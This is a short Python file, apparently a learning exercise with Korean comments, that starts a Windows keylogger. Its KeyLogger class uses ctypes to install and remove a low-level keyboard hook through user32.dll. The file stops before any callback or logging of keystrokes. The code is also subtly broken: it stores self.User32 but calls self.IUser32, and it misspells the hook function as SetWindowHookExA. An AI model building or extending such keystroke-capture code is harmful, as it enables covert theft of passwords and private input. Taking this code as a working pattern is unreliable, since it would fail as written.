import sys
from ctypes import *
from ctypes.util import *
from ctypes.wintypes import *
from ctypes.wintypes import MSG, DWORD


#python 동작 메모리중에 user32.dll 라이브러리가 들어옴
#kernel32.dll 라이브러리 로딩
#user32.dll 안에 setWindowsHookEx()함수가 있음
user32 = windll.user32
kernel32 = windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
VK_LCONTROL = 0xA2    #162


#definition of key logger class
class KeyLogger:
    def __init__(self):
        self.User32 = user32
        self.hooked = None
    def installHookProc(self, ptr):
        self.hooked = self.IUser32.SetWindowHookExA(
                          WH_KEYBOARD_LL,
                          ptr,
                          kernel32.GetModuleHandleW(None),
                          0
                      )
        if not self.hooked:
            return False
        return True
    def uninstallHookProc(self):
        if self.hooked is None:
            return
        print("uninstalling")
        self.IUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None
